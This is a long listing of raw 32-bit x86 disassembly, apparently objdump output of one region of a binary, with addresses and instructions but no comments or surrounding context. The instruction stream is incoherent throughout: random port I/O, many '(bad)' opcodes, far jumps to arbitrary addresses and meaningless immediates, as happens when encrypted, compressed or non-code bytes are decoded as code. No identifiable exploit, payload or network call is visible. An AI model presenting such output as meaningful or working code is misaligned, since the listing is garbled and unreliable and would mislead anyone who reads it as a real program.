  40e73b:	aas    
  40e73c:	add    eax,0x4e190e47
  40e741:	int3   
  40e742:	push   eax
  40e743:	pop    ecx
  40e744:	pushf  
  40e745:	mov    ds:0xb97eb647,al
  40e74a:	outs   dx,DWORD PTR ds:[esi]
  40e74b:	ja     0x40e6cd
  40e74d:	arpl   WORD PTR [ecx+0x253a6fff],cx
  40e753:	xlat   BYTE PTR ds:[ebx]
  40e754:	mov    ecx,0x4111200f
  40e759:	leave  
  40e75a:	shl    DWORD PTR [ecx-0x1d],1
  40e75d:	mov    dl,0xf4
  40e75f:	es xchg dh,cl
  40e762:	imul   DWORD PTR [eax+0x2b]
  40e765:	adc    esp,0xe13ee65d
  40e76b:	push   edx
  40e76c:	lahf   
  40e76d:	jg     0x40e76f
  40e76f:	mov    cl,0x8d
  40e771:	jne    0x40e75d
  40e773:	mov    bl,0x68
  40e775:	sub    eax,0x324bf163
  40e77a:	shr    BYTE PTR [ebp*8+0x39018da1],cl
  40e781:	push   cs
  40e782:	rol    DWORD PTR [ebp-0x5f],0xd8
  40e786:	adc    ch,BYTE PTR [ebp-0xd051e9]
  40e78c:	jle    0x40e805
  40e78e:	nop
  40e78f:	push   cs
  40e790:	mov    al,0x89
  40e792:	clc    
  40e793:	in     eax,0x54
  40e795:	jnp    0x40e7fe
  40e797:	in     al,dx
  40e798:	lods   eax,DWORD PTR ds:[esi]
  40e799:	je     0x40e75f
  40e79b:	adc    eax,0xd7dc31ba
  40e7a0:	mov    cl,0x51
  40e7a2:	xlat   BYTE PTR ds:[ebx]
  40e7a3:	or     DWORD PTR [ecx-0x9],esp
  40e7a6:	not    BYTE PTR [esi+0x34e09cbc]
  40e7ac:	pop    edx
  40e7ad:	outs   dx,DWORD PTR ds:[esi]
  40e7ae:	push   ss
  40e7af:	pop    eax
  40e7b0:	sar    cl,1
  40e7b2:	xchg   BYTE PTR [eax+0x26ca919d],cl
  40e7b8:	popa   
  40e7b9:	jp     0x40e779
  40e7bb:	dec    edx
  40e7bc:	sbb    bh,BYTE PTR [ebp-0x491839e3]
  40e7c2:	enter  0x87aa,0xde
  40e7c6:	test   DWORD PTR [ebp+ebx*4-0x3e],0x7cabaf13
  40e7ce:	call   0xc2c6f3c
  40e7d3:	sahf   
  40e7d4:	outs   dx,DWORD PTR ds:[esi]
  40e7d5:	jg     0x40e7ce
  40e7d7:	push   esi
  40e7d8:	cmp    eax,0x9b79fdee
  40e7dd:	fstp   TBYTE PTR [ebp+0x2b]
  40e7e0:	sbb    eax,eax
  40e7e2:	xchg   esi,eax
  40e7e3:	dec    eax
  40e7e4:	aad    0x38
  40e7e6:	inc    DWORD PTR [eax-0x6d3c3cff]
  40e7ec:	adc    eax,edi
  40e7ee:	mov    ecx,0xf6ca775b
  40e7f3:	pop    es
  40e7f4:	outs   dx,BYTE PTR ds:[esi]
  40e7f5:	push   ecx
  40e7f6:	dec    ebp
  40e7f7:	aad    0x4e
  40e7f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7fb:	lock pop esp
  40e7fd:	jge    0x40e7a8
  40e7ff:	icebp  
  40e800:	mov    BYTE PTR [ebx-0x63df9301],cl
  40e806:	ja     0x40e878
  40e808:	out    dx,al
  40e809:	mov    bh,BYTE PTR [edi]
  40e80b:	dec    edx
  40e80c:	imul   BYTE PTR ds:0x7c67fe39
  40e812:	sahf   
  40e813:	(bad)  
  40e814:	sbb    eax,0x53b0205c
  40e819:	pop    esp
  40e81a:	or     eax,0x2f11e274
  40e81f:	push   ss
  40e820:	cdq    
  40e821:	pop    ss
  40e822:	mov    ds:0xbdc24eba,eax
  40e827:	sbb    eax,0xbc438884
  40e82c:	jg     0x40e880
  40e82e:	out    dx,al
  40e82f:	mov    dl,0x24
  40e831:	rcr    DWORD PTR [ebx+0x2063a7da],0x6a
  40e838:	loope  0x40e86e
  40e83a:	mov    ah,0x3c
  40e83c:	pushf  
  40e83d:	das    
  40e83e:	jecxz  0x40e850
  40e840:	mov    ds:0xa4e3068c,al
  40e845:	out    0xb,eax
  40e847:	inc    eax
  40e848:	hlt    
  40e849:	sbb    eax,0x2da3d367
  40e84e:	out    0xd,eax
  40e850:	inc    edi
  40e851:	mov    ah,0x9a
  40e853:	gs mov dl,0x1e
  40e856:	mov    ds:0x9c34f87d,eax
  40e85b:	pop    edi
  40e85d:	je     0x40e8bd
  40e85f:	xchg   edx,eax
  40e860:	in     al,dx
  40e861:	fldcw  WORD PTR [eax-0x6842b81d]
  40e867:	mov    ah,0xca
  40e869:	les    ecx,FWORD PTR [esi-0x4b]
  40e86c:	xchg   esi,eax
  40e86d:	dec    esp
  40e86e:	mov    edx,DWORD PTR [esi]
  40e870:	lds    esi,FWORD PTR ds:0x4749ffeb
  40e876:	dec    edx
  40e877:	cmp    al,0x4
  40e879:	jnp    0x40e867
  40e87b:	or     eax,0x51b9e118
  40e880:	lods   eax,DWORD PTR ds:[esi]
  40e881:	push   edi
  40e882:	push   edx
  40e883:	lods   al,BYTE PTR ds:[esi]
  40e884:	cmp    ebp,esp
  40e886:	push   ebx
  40e887:	fcom   st(0)
  40e889:	test   ecx,edx
  40e88b:	or     edx,DWORD PTR [esi]
  40e88d:	cmp    BYTE PTR [ebp+eiz*2-0x79],dl
  40e891:	das    
  40e892:	clc    
  40e893:	jo     0x40e8b2
  40e895:	mov    edx,0xfabd588a
  40e89a:	cmp    BYTE PTR [eax-0x68aaff8],bl
  40e8a0:	add    eax,0xd8e4a49a
  40e8a5:	add    bl,BYTE PTR [edi]
  40e8a7:	pop    ebx
  40e8a8:	daa    
  40e8a9:	push   esi
  40e8aa:	and    BYTE PTR [ebx-0x2e],cl
  40e8ad:	data16 ror BYTE PTR [ebx+0x5f73327e],1
  40e8b4:	mov    cl,0xba
  40e8b6:	sub    eax,0xf167ec30
  40e8bb:	xchg   ebx,eax
  40e8bc:	xor    BYTE PTR [eax],al
  40e8be:	and    ecx,DWORD PTR [edx-0x3f]
  40e8c1:	cmp    eax,0x56b85461
  40e8c6:	push   0x2506e78c
  40e8cb:	jmp    0x40e8cd
  40e8cd:	jbe    0x40e874
  40e8cf:	fld    QWORD PTR [edx]
  40e8d1:	mov    WORD PTR gs:[ebx-0x33],fs
  40e8d5:	popf   
  40e8d6:	pop    esp
  40e8d7:	dec    esp
  40e8d8:	xor    al,0x9e
  40e8da:	xlat   BYTE PTR ds:[ebx]
  40e8db:	int3   
  40e8dc:	rol    BYTE PTR ds:0x60378be7,1
  40e8e2:	cs cmc 
  40e8e4:	xlat   BYTE PTR ds:[ebx]
  40e8e5:	rol    BYTE PTR [ebx-0x4c],1
  40e8e8:	add    edx,DWORD PTR [esi+0x35cb1e8d]
  40e8ee:	stos   DWORD PTR es:[edi],eax
  40e8ef:	lods   al,BYTE PTR ds:[esi]
  40e8f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8f1:	adc    ah,BYTE PTR [esi+edi*1+0x28378365]
  40e8f8:	repz pop eax
  40e8fa:	or     dl,BYTE PTR [ebx+0x1b]
  40e8fd:	push   ss
  40e8fe:	jge    0x40e8a2
  40e900:	ja     0x40e8b9
  40e902:	cmp    eax,0xd6f4f70e
  40e907:	(bad)  
  40e908:	jmp    0x40e957
  40e90a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e90b:	imul   ebp,DWORD PTR [ebx+0x7c],0x9e770d20
  40e912:	pop    edi
  40e913:	push   eax
  40e914:	hlt    
  40e915:	cmp    eax,0x6266b303
  40e91a:	add    DWORD PTR [esi+0x7c96e07e],ecx
  40e920:	push   ebx
  40e921:	cli    
  40e922:	dec    esi
  40e923:	test   BYTE PTR [edx-0x76],0x6f
  40e927:	push   ebp
  40e928:	call   FWORD PTR [edi+0x11]
  40e92b:	or     al,0x98
  40e92d:	fist   DWORD PTR [edx-0x71a15dfe]
  40e933:	lock retf 0x383c
  40e937:	mov    ch,0xce
  40e939:	and    eax,0x1dcb7553
  40e93e:	rcr    DWORD PTR [ecx+edx*4-0x4731fef2],0xd2
  40e946:	xchg   BYTE PTR [edx-0x5f2e48c4],al
  40e94c:	loope  0x40e975
  40e94e:	and    BYTE PTR [esi+eiz*4+0x1a],ah
  40e952:	xor    DWORD PTR [ebp+0x29649fa7],esp
  40e958:	mov    eax,ds:0xecaf0a54
  40e95d:	rcr    DWORD PTR [edi+ecx*4],cl
  40e960:	lods   eax,DWORD PTR ds:[esi]
  40e961:	pop    ebx
  40e962:	pop    ebp
  40e963:	mov    dh,0x7e
  40e965:	mov    ebp,0xb3a6c3ed
  40e96a:	mov    ds:0xb6277488,al
  40e96f:	mov    ch,0x67
  40e971:	stos   BYTE PTR es:[edi],al
  40e972:	in     eax,dx
  40e973:	push   0x0
  40e975:	cmp    eax,DWORD PTR [edi+0x72]
  40e978:	loop   0x40e905
  40e97a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e97b:	pop    ecx
  40e97c:	mov    dh,0xf
  40e97e:	add    eax,DWORD PTR [edi-0x621b12e9]
  40e984:	mov    edi,0xa8065e9
  40e989:	mov    esi,0x9669399
  40e98e:	mov    edi,ebx
  40e990:	test   eax,0x4214c3d7
  40e995:	outs   dx,BYTE PTR ds:[esi]
  40e996:	sub    al,0xda
  40e998:	iret   
  40e999:	dec    edi
  40e99a:	out    dx,al
  40e99b:	out    0xc1,eax
  40e99d:	out    0x67,eax
  40e99f:	not    BYTE PTR [edx+eax*8-0x474aa974]
  40e9a6:	shl    ah,1
  40e9a8:	mov    ds:0x33543cdc,eax
  40e9ad:	push   edi
  40e9ae:	sbb    eax,0x1484dd78
  40e9b3:	sbb    eax,0x6881111c
  40e9b8:	mov    ecx,0x1bee061
  40e9bd:	or     dh,BYTE PTR [ebx+0x2a0330d7]
  40e9c3:	scas   al,BYTE PTR es:[edi]
  40e9c4:	lahf   
  40e9c5:	imul   edi,ecx,0x1c
  40e9c8:	pushf  
  40e9c9:	in     al,dx
  40e9ca:	mov    ebp,0xaebc6a10
  40e9cf:	popa   
  40e9d0:	push   esp
  40e9d1:	push   ecx
  40e9d2:	shl    DWORD PTR [eax+edx*1+0x74],0xa9
  40e9d7:	adc    ch,BYTE PTR [esi+ebp*1-0x3f04611b]
  40e9de:	push   0x16c6a0b
  40e9e3:	pop    eax
  40e9e4:	mov    al,ds:0xf5e0a150
  40e9e9:	loope  0x40e9f2
  40e9eb:	adc    ecx,ebp
  40e9ed:	xchg   esp,eax
  40e9ee:	dec    edx
  40e9ef:	mov    edi,es
  40e9f1:	je     0x40ea61
  40e9f3:	xchg   esi,eax
  40e9f4:	test   BYTE PTR [ebx+0xe],dh
  40e9f7:	ja     0x40ea06
  40e9f9:	add    DWORD PTR [edi+edx*2],ebx
  40e9fc:	pop    esp
  40e9fd:	push   ecx
  40e9fe:	outs   dx,DWORD PTR ds:[esi]
  40e9ff:	stc    
  40ea00:	mov    esp,0xad10dc93
  40ea05:	sbb    esi,DWORD PTR [ebp+edi*4-0x7746300f]
  40ea0c:	addr16 mov al,ds:0x7017
  40ea10:	aad    0xe2
  40ea12:	outs   dx,DWORD PTR ds:[esi]
  40ea13:	(bad)  
  40ea14:	in     al,0x9a
  40ea16:	aad    0xd7
  40ea18:	dec    esi
  40ea19:	add    BYTE PTR [ebp+0xbec0da2],ch
  40ea1f:	addr16 mov esi,0x222450d8
  40ea25:	shl    DWORD PTR [ebp+0x436b90b3],1
  40ea2b:	fisttp DWORD PTR [ebp+0x13c81ebc]
  40ea31:	dec    edx
  40ea32:	in     eax,dx
  40ea33:	icebp  
  40ea34:	arpl   WORD PTR ds:0x6f00d3a0,di
  40ea3a:	(bad)  
  40ea3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea3c:	mov    eax,ds:0x205f4dcd
  40ea41:	idiv   DWORD PTR [edi-0xd]
  40ea44:	mov    ebp,0x52e3e8c
  40ea49:	stos   DWORD PTR es:[edi],eax
  40ea4a:	push   ds
  40ea4b:	adc    bh,BYTE PTR [eax+0x3592b282]
  40ea51:	test   eax,0xa8b9476c
  40ea56:	js     0x40e9f9
  40ea58:	int    0x38
  40ea5a:	imul   ecx,esi,0xec67f053
  40ea60:	les    eax,FWORD PTR [edi+0x59684797]
  40ea66:	outs   dx,DWORD PTR ds:[esi]
  40ea67:	arpl   si,di
  40ea69:	push   ds
  40ea6a:	mov    dl,0x82
  40ea6c:	sub    ebx,DWORD PTR [edi]
  40ea6e:	push   esp
  40ea6f:	mov    ecx,0x950f41f9
  40ea74:	lock pop ebx
  40ea76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea77:	aad    0xe3
  40ea79:	out    0x9,al
  40ea7b:	pop    ds
  40ea7c:	test   al,al
  40ea7e:	mov    ch,0xec
  40ea80:	ret    0x621e
  40ea83:	iret   
  40ea84:	jge    0x40eaf8
  40ea86:	dec    esp
  40ea87:	cli    
  40ea88:	jne    0x40ea4d
  40ea8a:	add    DWORD PTR [bp+si-0x51ec],esp
  40ea8f:	sahf   
  40ea90:	leave  
  40ea91:	rcr    DWORD PTR ds:0xc0e896a4,cl
  40ea97:	xor    ebp,0x74d75151
  40ea9d:	push   ss
  40ea9e:	xor    eax,0x830e9478
  40eaa3:	popf   
  40eaa4:	and    BYTE PTR [edx-0x6a],0xf7
  40eaa8:	add    BYTE PTR [ecx-0x6b352f97],bh
  40eaae:	in     al,dx
  40eaaf:	adc    DWORD PTR [ebp+0x43],eax
  40eab2:	dec    eax
  40eab3:	push   cs
  40eab4:	in     eax,dx
  40eab5:	inc    dh
  40eab7:	(bad)  
  40eab8:	xor    edx,DWORD PTR [esp+ebp*4+0x39464749]
  40eabf:	loop   0x40ea65
  40eac1:	sub    DWORD PTR [esi+0x50],ebp
  40eac4:	aam    0xea
  40eac6:	mov    ah,0x56
  40eac8:	mov    ds:0xc9e59e0b,al
  40eacd:	mov    ebx,0xd41d74d1
  40ead2:	or     cl,BYTE PTR [ebp+ecx*2-0x5153d0d7]
  40ead9:	mov    ?,esp
  40eadb:	aas    
  40eadc:	jnp    0x40eb1a
  40eade:	sub    edx,esi
  40eae0:	data16 out dx,al
  40eae2:	stc    
  40eae3:	add    cl,BYTE PTR [edi-0x2c838d75]
  40eae9:	mov    dl,ch
  40eaeb:	jne    0x40ea7a
  40eaed:	inc    ebx
  40eaee:	add    al,0x2
  40eaf0:	xchg   edi,eax
  40eaf1:	inc    edx
  40eaf2:	sbb    esi,DWORD PTR [eax+0x64]
  40eaf5:	ds jecxz 0x40ea78
  40eaf8:	call   0x65fd8a88
  40eafd:	mov    DWORD PTR [esp+edx*8-0xd],esp
  40eb01:	xchg   ecx,eax
  40eb02:	rol    DWORD PTR [ebx-0x65e99ee9],0xb5
  40eb09:	(bad)  
  40eb0a:	in     al,dx
  40eb0b:	sbb    dh,bh
  40eb0d:	imul   ebp,esp,0x85d8fef7
  40eb13:	cmp    esi,edi
  40eb15:	sub    eax,0xe9e65357
  40eb1a:	dec    esi
  40eb1b:	jo     0x40eb34
  40eb1d:	lds    edi,FWORD PTR [eax-0x5a]
  40eb20:	jg     0x40eb04
  40eb22:	jmp    0x1a98c4e0
  40eb27:	adc    BYTE PTR [ebp-0x3996c52a],al
  40eb2d:	sbb    BYTE PTR [ebp+ebx*8+0x7fe86d0e],al
  40eb34:	pop    es
  40eb35:	adc    BYTE PTR [ebx+0x4e],0xc5
  40eb39:	xchg   BYTE PTR [edx+0x2a],ch
  40eb3c:	push   ds
  40eb3d:	cs cmp ebp,edx
  40eb40:	xor    ebp,esi
  40eb42:	aas    
  40eb43:	xlat   BYTE PTR ds:[ebx]
  40eb44:	clc    
  40eb45:	cmp    bh,BYTE PTR [esi]
  40eb47:	out    0x78,eax
  40eb49:	and    DWORD PTR [ebp-0x42b319a],esp
  40eb4f:	push   ebx
  40eb50:	daa    
  40eb51:	stc    
  40eb52:	pushf  
  40eb53:	cmp    ch,BYTE PTR es:0x839349e7
  40eb5a:	jp     0x40eb12
  40eb5c:	(bad)  
  40eb5d:	fiadd  DWORD PTR [edx]
  40eb5f:	or     eax,0x4e808ec8
  40eb64:	cmp    eax,0x850cc6fc
  40eb69:	xchg   ebx,eax
  40eb6a:	repz jbe 0x40eb2d
  40eb6d:	push   ebp
  40eb6e:	cmp    eax,0x7671572e
  40eb73:	je     0x40eba0
  40eb75:	mov    eax,DWORD PTR ss:[eax+0x36]
  40eb79:	and    eax,0xa6455d77
  40eb7e:	xchg   esp,eax
  40eb7f:	jne    0x40ebdf
  40eb81:	int    0x3c
  40eb83:	pop    ebp
  40eb84:	lods   al,BYTE PTR ds:[esi]
  40eb85:	cld    
  40eb86:	sahf   
  40eb87:	repz shl DWORD PTR [ebp-0x7d],0xd2
  40eb8c:	dec    eax
  40eb8d:	(bad)  
  40eb8e:	rcr    bh,cl
  40eb90:	jmp    0x2b00f2a5
  40eb95:	fwait
  40eb96:	(bad)  
  40eb97:	lahf   
  40eb98:	inc    ecx
  40eb99:	dec    ebp
  40eb9a:	push   eax
  40eb9b:	xchg   edi,eax
  40eb9c:	into   
  40eb9d:	(bad)  
  40eb9e:	repnz int3 
  40eba0:	pop    ebp
  40eba1:	test   BYTE PTR ds:0xac1d530f,0xf4
  40eba8:	or     ebp,eax
  40ebaa:	sar    DWORD PTR [edx+0x782d012a],cl
  40ebb0:	jno    0x40ec0d
  40ebb2:	and    ebx,DWORD PTR [eax]
  40ebb4:	scas   al,BYTE PTR es:[edi]
  40ebb5:	sti    
  40ebb6:	mov    BYTE PTR [edx+ebx*4],bh
  40ebb9:	push   0x7432cff5
  40ebbe:	xchg   ebp,eax
  40ebbf:	cmp    al,0x5d
  40ebc1:	mov    ebx,0x30d84a2b
  40ebc6:	js     0x40ec39
  40ebc8:	sahf   
  40ebc9:	push   0x9b2c64bb
  40ebce:	mov    ds:0x39cfc0f5,al
  40ebd3:	cld    
  40ebd4:	xchg   ebx,eax
  40ebd5:	jmp    0x40ec13
  40ebd7:	das    
  40ebd8:	add    eax,0x47bba2e5
  40ebdd:	mov    esi,0x15a0a203
  40ebe2:	rcl    DWORD PTR [esi+0x1d0b0a8f],0x55
  40ebe9:	shl    DWORD PTR [edi-0x44078e87],cl
  40ebef:	lock pop ds
  40ebf1:	and    DWORD PTR [edx+eiz*2+0x5b],ecx
  40ebf5:	and    al,0x77
  40ebf7:	and    DWORD PTR [ebx-0x48dc3b22],0x1c
  40ebfe:	je     0x40ebc5
  40ec00:	ss cmp dl,bl
  40ec03:	les    edx,FWORD PTR [edx+ebx*2]
  40ec06:	inc    ecx
  40ec07:	je     0x40ec3d
  40ec09:	jmp    0x4000c12d
  40ec0e:	mov    ?,WORD PTR [ecx+eax*4]
  40ec11:	mov    edx,0x8ab9d85f
  40ec16:	test   eax,0xbf832e68
  40ec1b:	pop    ebx
  40ec1c:	call   0x99e447bd
  40ec21:	dec    ebp
  40ec22:	sbb    DWORD PTR [ebx+0x20dddbd5],edx
  40ec28:	mov    ebp,DWORD PTR [edi-0x7b]
  40ec2b:	xchg   ecx,eax
  40ec2c:	adc    cl,0x32
  40ec2f:	xchg   BYTE PTR [edx],ah
  40ec31:	push   es
  40ec32:	or     BYTE PTR [ebx],al
  40ec34:	fisub  DWORD PTR [edx]
  40ec36:	ja     0x40ebe7
  40ec38:	xchg   ebp,eax
  40ec39:	or     dl,BYTE PTR [ebp+0x1e6254cb]
  40ec3f:	pop    edx
  40ec40:	mov    esp,0x618562d7
  40ec45:	shr    esp,1
  40ec47:	xchg   BYTE PTR [ebp-0x2da28f79],bl
  40ec4d:	dec    ebx
  40ec4e:	cmp    DWORD PTR [edi],edx
  40ec50:	sbb    BYTE PTR [edx+ebx*2],bh
  40ec53:	rol    BYTE PTR [edi+eax*8+0x7],cl
  40ec57:	fisubr WORD PTR [ebp+0x30]
  40ec5a:	scas   eax,DWORD PTR es:[edi]
  40ec5b:	out    dx,eax
  40ec5c:	sub    edx,edx
  40ec5e:	ror    DWORD PTR [eax],0x54
  40ec61:	sub    BYTE PTR [edi+0x28],0x15
  40ec65:	inc    ebp
  40ec66:	test   bl,dl
  40ec68:	mov    cl,0x1b
  40ec6a:	inc    edx
  40ec6b:	pop    edi
  40ec6c:	lods   al,BYTE PTR ds:[esi]
  40ec6d:	scas   al,BYTE PTR es:[edi]
  40ec6e:	adc    cl,bh
  40ec70:	jns    0x40ec7c
  40ec72:	and    BYTE PTR [ebp-0x73],0x1b
  40ec76:	push   ebp
  40ec77:	push   ebx
  40ec78:	mov    cl,BYTE PTR [ebx+0x6b]
  40ec7b:	xchg   DWORD PTR [edi+0x1ca47158],ebx
  40ec81:	repz loop 0x40eca3
  40ec84:	and    BYTE PTR [eax-0x35],bl
  40ec87:	mov    ds:0xc3bb6d3c,eax
  40ec8c:	ins    DWORD PTR es:[edi],dx
  40ec8d:	sbb    ch,BYTE PTR ds:0x22df2d9
  40ec93:	jge    0x40ec5c
  40ec95:	stos   BYTE PTR es:[edi],al
  40ec96:	mov    al,0xea
  40ec98:	or     BYTE PTR cs:[ebp+0x3],cl
  40ec9c:	mov    ebx,0xc9d79786
  40eca1:	xchg   BYTE PTR [esp+ebp*4-0x53],cl
  40eca5:	rcl    esp,0x9b
  40eca8:	mov    fs,ebx
  40ecaa:	mov    al,ds:0x9676b581
  40ecaf:	and    cl,BYTE PTR [esi-0xb739076]
  40ecb5:	mov    edi,0xa58bb276
  40ecba:	jno    0x40ed22
  40ecbc:	loopne 0x40ec9b
  40ecbe:	sub    ecx,ecx
  40ecc0:	out    0x83,eax
  40ecc2:	shl    BYTE PTR [ecx],1
  40ecc4:	aaa    
  40ecc5:	mov    esp,0x51889ccf
  40ecca:	jmp    FWORD PTR [ebx-0x3]
  40eccd:	test   DWORD PTR [esi],0x2a1fab7c
  40ecd3:	or     eax,0xd5a3341e
  40ecd8:	dec    ebx
  40ecd9:	hlt    
  40ecda:	dec    ebp
  40ecdb:	push   edi
  40ecdc:	mov    edx,0x95077fd9
  40ece1:	jmp    0x3fba8799
  40ece6:	outs   dx,BYTE PTR ds:[esi]
  40ece7:	fld    TBYTE PTR [edx+0x7c0c87b5]
  40eced:	mov    ds:0x463e7dab,eax
  40ecf2:	sbb    eax,0xf2c5c78f
  40ecf7:	pop    ebx
  40ecf8:	mov    ebx,0x8e1f56ad
  40ecfd:	jmp    FWORD PTR [edi+ecx*1+0x1171b045]
  40ed04:	adc    al,0x54
  40ed06:	out    0x6b,al
  40ed08:	mov    bh,0xe4
  40ed0a:	xchg   ebx,eax
  40ed0b:	not    bl
  40ed0d:	sahf   
  40ed0e:	ins    DWORD PTR es:[edi],dx
  40ed0f:	imul   eax,DWORD PTR ds:0x41c26f12,0x6
  40ed16:	jb     0x40eca8
  40ed18:	xor    esp,eax
  40ed1a:	mov    DWORD PTR [ecx+0x31],edi
  40ed1d:	dec    edx
  40ed1e:	(bad)  
  40ed1f:	xlat   BYTE PTR ds:[ebx]
  40ed20:	(bad)  
  40ed21:	dec    edi
  40ed22:	mov    WORD PTR [ebp+eiz*8-0x58],cs
  40ed26:	lock (bad) 
  40ed28:	sbb    al,0x11
  40ed2a:	mov    esi,0x5cd9ed06
  40ed2f:	push   ss
  40ed30:	push   DWORD PTR [edi-0x2b]
  40ed33:	mov    ds:0xd819c821,al
  40ed38:	sbb    ebx,DWORD PTR [edx+0x4129f55c]
  40ed3e:	sub    al,0x7f
  40ed40:	ret    0xf2df
  40ed43:	cmp    bh,dh
  40ed45:	xchg   eax,esp
  40ed47:	lahf   
  40ed48:	xor    al,0x4
  40ed4a:	test   BYTE PTR [edi-0x6ce5fb2f],al
  40ed50:	iret   
  40ed51:	mov    ebx,0xe690a63f
  40ed56:	jp     0x40ed2b
  40ed58:	and    cl,bh
  40ed5a:	adc    al,0x1e
  40ed5c:	xchg   esi,eax
  40ed5d:	sbb    al,0x8
  40ed5f:	ins    BYTE PTR es:[edi],dx
  40ed60:	or     DWORD PTR [ebx+edi*8+0x3b],ecx
  40ed64:	inc    ebx
  40ed65:	xor    BYTE PTR [ecx-0x75],cl
  40ed68:	pop    edx
  40ed69:	mov    cl,0x83
  40ed6b:	cmp    ch,BYTE PTR [ebp+0x52731cb]
  40ed71:	aas    
  40ed72:	pop    ss
  40ed73:	mov    ds:0xbf70eafd,al
  40ed78:	fs mov al,0x54
  40ed7b:	popa   
  40ed7c:	(bad)  
  40ed7e:	leave  
  40ed7f:	push   eax
  40ed80:	aad    0x8f
  40ed82:	mov    cl,0x12
  40ed84:	in     al,dx
  40ed85:	xchg   esi,eax
  40ed86:	jge    0x40edc0
  40ed88:	cmp    ah,cl
  40ed8a:	and    eax,0x5666b0e6
  40ed8f:	sub    ah,bh
  40ed91:	xchg   bh,al
  40ed93:	stos   DWORD PTR es:[edi],eax
  40ed94:	ins    BYTE PTR es:[edi],dx
  40ed95:	cli    
  40ed96:	xor    bl,BYTE PTR [esi-0x743eeb80]
  40ed9c:	shr    ah,0x14
  40ed9f:	ss leave 
  40eda1:	rcl    esp,0x80
  40eda4:	xchg   esi,eax
  40eda5:	test   BYTE PTR [ebx],ah
  40eda7:	mov    ecx,0x6a84359c
  40edac:	(bad)  
  40edae:	sub    al,0x88
  40edb0:	mov    eax,0x494b5bad
  40edb5:	(bad)  [edi+0x48ace265]
  40edbb:	inc    edx
  40edbc:	loope  0x40ed8f
  40edbe:	xchg   DWORD PTR [edx-0x43],esi
  40edc1:	stc    
  40edc2:	repz jle 0x40ee3c
  40edc5:	and    al,0x4b
  40edc7:	xor    ch,0x15
  40edca:	add    al,0x9
  40edcc:	mov    ebp,0xc230d2d3
  40edd1:	pusha  
  40edd2:	mov    esi,0x773aa689
  40edd7:	fidivr DWORD PTR [ebp+0x37]
  40edda:	repz retf 0x9c34
  40edde:	scas   eax,DWORD PTR es:[edi]
  40eddf:	pop    ebx
  40ede0:	les    ecx,FWORD PTR [ecx]
  40ede2:	loopne 0x40ed70
  40ede4:	retf   
  40ede5:	fstp   DWORD PTR [esi+0x5]
  40ede8:	iret   
  40ede9:	std    
  40edea:	adc    ebx,DWORD PTR [edi-0x64024df7]
  40edf0:	jge    0x40ee31
  40edf2:	pusha  
  40edf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edf4:	shl    BYTE PTR ds:0xe067beaa,cl
  40edfa:	jns    0x40ee63
  40edfc:	or     BYTE PTR [eax-0x66],dl
  40edff:	test   eax,0xab6a2064
  40ee04:	out    0xe,eax
  40ee06:	mov    ah,0x41
  40ee08:	and    edi,DWORD PTR [esp+edx*1]
  40ee0b:	(bad)  
  40ee0c:	mov    ds:0x8c43dd2e,al
  40ee11:	dec    eax
  40ee12:	jo     0x40edb2
  40ee14:	sar    DWORD PTR [edi],0x31
  40ee17:	mov    bh,bh
  40ee19:	sbb    eax,0x2619fbdd
  40ee1e:	pusha  
  40ee1f:	sub    ebx,DWORD PTR [esi+0x40]
  40ee22:	push   edx
  40ee23:	ins    DWORD PTR es:[edi],dx
  40ee24:	push   ss
  40ee25:	fbld   TBYTE PTR [edx+0x42]
  40ee28:	jo     0x40ee88
  40ee2a:	jb     0x40ee41
  40ee2c:	call   0x26e77a8c
  40ee31:	int3   
  40ee32:	repz adc bl,BYTE PTR [edx+0x79]
  40ee36:	je     0x40edd1
  40ee38:	(bad)  
  40ee39:	dec    esp
  40ee3a:	shl    DWORD PTR [ebp-0x7a],cl
  40ee3d:	jmp    0x57f99b88
  40ee42:	push   ebp
  40ee43:	adc    eax,0x33055736
  40ee48:	xchg   BYTE PTR [ecx],bh
  40ee4a:	hlt    
  40ee4b:	mov    esp,0x4e4b8e5f
  40ee50:	aam    0x66
  40ee52:	lock inc eax
  40ee54:	push   ebx
  40ee55:	or     BYTE PTR [esi-0x3a9ee7a2],cl
  40ee5b:	dec    esi
  40ee5c:	rcl    edi,1
  40ee5e:	adc    eax,0x83f1730c
  40ee63:	add    ah,0x32
  40ee66:	jecxz  0x40ee98
  40ee68:	mov    esi,0xfd134eae
  40ee6d:	jmp    0x68f9:0xc98fcd24
  40ee74:	ins    BYTE PTR es:[edi],dx
  40ee75:	or     BYTE PTR [ebp+0x3b37fe36],dl
  40ee7b:	push   ebx
  40ee7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee7d:	push   0x6c
  40ee7f:	dec    ecx
  40ee80:	mov    al,ds:0x4f7ef017
  40ee85:	jmp    0x40ee2f
  40ee87:	jb     0x40ee11
  40ee89:	mov    esi,0x6e3d67e4
  40ee8e:	pop    ss
  40ee8f:	cmc    
  40ee90:	or     bh,BYTE PTR [ebx]
  40ee92:	sub    cl,cl
  40ee94:	cmc    
  40ee95:	mov    ebx,0x5f2e6379
  40ee9a:	adc    al,0x6
  40ee9c:	mov    al,ds:0x589ca705
  40eea1:	test   BYTE PTR [esi-0x12],cl
  40eea4:	jno    0x40ee29
  40eea6:	das    
  40eea7:	test   al,0xf0
  40eea9:	lahf   
  40eeaa:	mov    eax,0xd8a73abe
  40eeaf:	mov    dl,0x2
  40eeb1:	sbb    DWORD PTR [esi+edx*4-0x6],ebp
  40eeb5:	mov    eax,ds:0xc92dc7f7
  40eeba:	arpl   WORD PTR [eax],bx
  40eebc:	mov    dh,BYTE PTR ds:0x5593828f
  40eec2:	xchg   ebx,eax
  40eec3:	sub    DWORD PTR [ecx+ebx*8],esp
  40eec6:	das    
  40eec7:	int3   
  40eec8:	dec    esp
  40eec9:	in     al,dx
  40eeca:	outs   dx,DWORD PTR ds:[esi]
  40eecb:	je     0x40eeb1
  40eecd:	sub    eax,0x2ad65591
  40eed2:	in     eax,0xd7
  40eed4:	retf   0x44d8
  40eed7:	pop    ecx
  40eed8:	mov    cl,0xec
